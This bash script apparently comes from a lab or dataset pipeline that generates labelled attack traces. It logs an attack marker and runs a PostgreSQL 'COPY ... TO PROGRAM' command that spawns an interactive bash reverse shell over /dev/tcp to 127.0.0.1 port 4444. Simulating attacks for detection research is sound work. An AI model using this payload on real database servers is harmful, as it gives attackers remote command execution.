#!/bin/bash
echo "Simulating Reverse Shell (Attack 5)..."

/dataset_workspace/logger.sh mark_attack "attack_reverse_shell" start

# Attempt to spawn a reverse shell from the postgres backend process
psql -U postgres -d casce_tpcb -c "COPY (SELECT 1) TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &\" || true';"

/dataset_workspace/logger.sh mark_attack "attack_reverse_shell" end

echo "Reverse shell attempted."
